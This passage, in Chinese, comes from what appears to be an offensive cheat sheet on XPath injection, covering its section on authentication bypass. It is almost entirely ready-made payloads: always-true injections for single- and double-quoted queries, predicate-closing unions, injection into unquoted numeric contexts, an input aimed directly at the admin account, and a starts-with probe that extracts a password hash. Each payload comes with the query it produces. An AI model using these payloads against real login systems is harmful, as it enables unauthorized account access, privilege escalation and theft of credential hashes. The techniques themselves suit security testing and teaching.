## 三、认证绕过

### 3.1 经典认证绕过
原始查询：`//user[username/text()='INPUT_USER' and password/text()='INPUT_PASS']`

```
用户: ' or '1'='1
密码: ' or '1'='1
→ //user[username/text()='' or '1'='1' and password/text()='' or '1'='1']
→ 永真，返回第一个用户（通常为admin）

用户: ' or 1=1 or '
密码: 任意
→ 同上，1=1数值比较

用户: ']|//*|xxx['
→ 闭合谓词并联合所有节点（见第四章）

用户: admin' or 'a'='b
密码: ' or '1'='2
→ 联合控制逻辑顺序（利用AND优先级高于OR）

用户: ' or string-length(password)>0 or '
→ 查询密码非空的用户（信息泄露辅助）

用户: ' or //user[username='admin'] or '
→ 直接锁定admin
```

### 3.2 双引号场景
```
# 查询使用双引号: //user[username="INPUT" and password="INPUT"]
用户: " or "1"="1
密码: " or "1"="1
```

### 3.3 高级认证绕过变体
```
# 谓词内注入（不依赖引号闭合）
# 原始: //user[@id='INPUT']
输入: 1] or true() or ['1'='1
→ //user[@id='1'] or true() or ['1'='1']  → 永真

# 注入位置为数值/无引号上下文
输入: 1 or 1=1
→ //user[@id=1 or 1=1]

# 提取管理员口令hash（认证逻辑复用）
' or 1=1 and starts-with(//user[1]/password,'$2y') or '
```
**要点**：认证绕过常与信息泄露联动——绕过后返回的第一个节点往往携带role/权限字段，直接构成越权。

